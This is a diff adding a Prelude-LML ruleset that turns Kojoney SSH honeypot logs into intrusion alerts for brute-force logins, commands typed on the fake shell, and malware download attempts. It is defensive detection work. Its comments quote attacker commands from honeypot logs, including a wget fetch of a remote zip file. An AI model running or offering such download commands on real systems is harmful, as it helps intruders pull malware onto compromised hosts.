@@ -1,0 +1,119 @@
+#####
+#
+# Copyright (C) 2007 Bjoern Weiland <bjoern-dot-weiland-at-web-dot-de>
+# All Rights Reserved
+#
+# This file is part of the Prelude-LML program.
+#
+# This program is free software; you can redistribute it and/or modify
+# it under the terms of the GNU General Public License as published by
+# the Free Software Foundation; either version 2, or (at your option)
+# any later version.
+#
+# This program is distributed in the hope that it will be useful,
+# but WITHOUT ANY WARRANTY; without even the implied warranty of
+# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
+# GNU General Public License for more details.
+#
+# You should have received a copy of the GNU General Public License along
+# with this program; if not, write to the Free Software Foundation, Inc.,
+# 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.
+#
+#####
+
+#Ruleset fot the Kojoney SSH Honeypot
+#
+#2007/04/12 21:57 CEST [SSHService ssh-userauth on SSHServerTransport,3,88.64.180.35] root trying auth password
+#2007/04/12 21:57 CEST [SSHService ssh-userauth on SSHServerTransport,3,88.64.180.35] root authenticated with password
+#2007/04/12 21:57 CEST [SSHChannel session (0) on SSHService ssh-connection on SSHServerTransport,3,88.64.180.35] COMMAND IS : pwd
+#2007/04/13 02:51 CEST [SSHChannel session (0) on SSHService ssh-connection on SSHServerTransport,7,62.57.64.166] executing command "id"
+
+
+#LOG:2007/04/12 21:57 CEST [SSHService ssh-userauth on SSHServerTransport,3,88.64.180.35] root trying auth password
+ regex=\[SSHService ssh-userauth on SSHServerTransport,\d+,(\S+)\] (\S+) trying auth password; \
+ classification.text=SSH Brute Force Login Attempt; \
+ id=20000; \
+ revision=1; \
+ analyzer(0).name=Kojoney SSH Honeypot; \
+ analyzer(0).manufacturer=http://kojoney.sourceforge.net; \
+ analyzer(0).class=Honeypot; \
+ source(0).node.address(0).address=$1; \
+ target(0).user.category=os-device; \
+ target(0).user.user_id(0).type=target-user; \
+ target(0).user.user_id(0).name=$2; \
+ assessment.impact.type=user; \
+ assessment.impact.severity=medium; \
+ assessment.impact.description=Someone tried to log into the SSH Honeypot with guessed username/password combinations; \
+ last;
+
+#LOG:2007/04/12 21:57 CEST [SSHService ssh-userauth on SSHServerTransport,3,88.64.180.35] root authenticated with password
+ regex=\[SSHService ssh-userauth on SSHServerTransport,\d+,(\S+)\] (\S+) authenticated with password; \
+ classification.text=SSH Login; \
+ id=20001; \
+ revision=2; \
+ analyzer(0).name=Kojoney SSH Honeypot; \
+ analyzer(0).manufacturer=http://kojoney.sourceforge.net; \
+ analyzer(0).class=Honeypot; \
+ source(0).node.address(0).address=$1; \
+ target(0).user.category=os-device; \
+ target(0).user.user_id(0).type=target-user; \
+ target(0).user.user_id(0).name=$2; \
+ assessment.impact.completion=succeeded; \
+ assessment.impact.type=user; \
+ assessment.impact.severity=high; \
+ assessment.impact.description=A Brute Force Login on the SSH Honeypot was successful; \
+ last;
+
+#LOG:2007/04/12 21:57 CEST [SSHChannel session (0) on SSHService ssh-connection on SSHServerTransport,3,88.64.180.35] COMMAND IS : wget http://www.test.de/bla.zip // executing command "id"
+ regex=\[SSHChannel session \(\d+\) on SSHService ssh-connection on SSHServerTransport,\d+,(\S+)\] (executing .*|COMMAND .*); \
+ classification.text=SSH commands given on Honeypot command line; \
+ id=20002; \
+ revision=1; \
+ analyzer(0).name=Kojoney SSH Honeypot; \
+ analyzer(0).manufacturer=http://kojoney.sourceforge.net; \
+ analyzer(0).class=Honeypot; \
+ source(0).node.address(0).address=$1; \
+ assessment.impact.completion=failed; \
+ assessment.impact.type=user; \
+ assessment.impact.severity=high; \
+ assessment.impact.description=An attacker gave commands on the virtual shell; \
+ additional_data(0).type=string; \
+ additional_data(0).meaning=Command; \
+ additional_data(0).data=$2; \
+ last;
+
+#LOG:2007/04/12 21:57 CEST [SSHChannel session (0) on SSHService ssh-connection on SSHServerTransport,3,88.64.180.35] Saved the file /var/log/kojoney/http___attacker_100free_com_all_tar212 requested by the attacker.
+ regex=\[SSHChannel session \(\d+\) on SSHService ssh-connection on SSHServerTransport,\d+,(\S+)\] Saved the file (.*) requested by the attacker; \
+ classification.text=Malware download attempt; \
+ id=20003; \
+ revision=1; \
+ analyzer(0).name=Kojoney SSH Honeypot; \
+ analyzer(0).manufacturer=http://kojoney.sourceforge.net; \
+ analyzer(0).class=Honeypot; \
+ source(0).node.address(0).address=$1; \
+ assessment.impact.completion=succeeded; \
+ assessment.impact.type=user; \
+ assessment.impact.severity=high; \
+ assessment.impact.description=An attacker tried to download something. The file has been saved.; \
+ additional_data(0).type=string; \
+ additional_data(0).meaning=Filename; \
+ additional_data(0).data=$2; \
+ last;
+
+#LOG:2007/04/12 21:57 CEST [SSHChannel session (0) on SSHService ssh-connection on SSHServerTransport,3,88.64.180.35] Error downloading file http://attacker_100free_com_all_tar212 request by attacker.
+ regex=\[SSHChannel session \(\d+\) on SSHService ssh-connection on SSHServerTransport,\d+,(\S+)\] Error downloading file (.*) request by attacker; \
+ classification.text=Malware download attempt; \
+ id=20004; \
+ revision=1; \
+ analyzer(0).name=Kojoney SSH Honeypot; \
+ analyzer(0).manufacturer=http://kojoney.sourceforge.net; \
+ analyzer(0).class=Honeypot; \
+ source(0).node.address(0).address=$1; \
+ assessment.impact.completion=failed; \
+ assessment.impact.type=user; \
+ assessment.impact.severity=medium; \
+ assessment.impact.description=An attacker tried to download something, but the file could not be saved.; \
+ additional_data(0).type=string; \
+ additional_data(0).meaning=Filename; \
+ additional_data(0).data=$2; \
+ last;
